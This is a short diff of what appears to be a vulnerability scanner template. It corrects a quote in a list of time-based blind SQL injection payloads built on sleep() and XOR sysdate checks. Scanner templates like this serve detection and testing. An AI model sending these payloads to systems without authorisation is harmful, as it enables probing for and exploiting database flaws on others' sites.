@@ -12,7 +12,7 @@ http:
         - "{{BaseURL}}" 
     payloads:
       injection:
-      - "1 or sleep(5)#"
+      - "1' or sleep(5)#"
       - "'XOR(if(now()=sysdate(),sleep(7),0))XOR'X"
       - "'XOR(if(now()=sysdate(),sleep(7),0))XOR'Z"
       - "'XOR(if((select now()=sysdate()),sleep(7),0))XOR'Z"
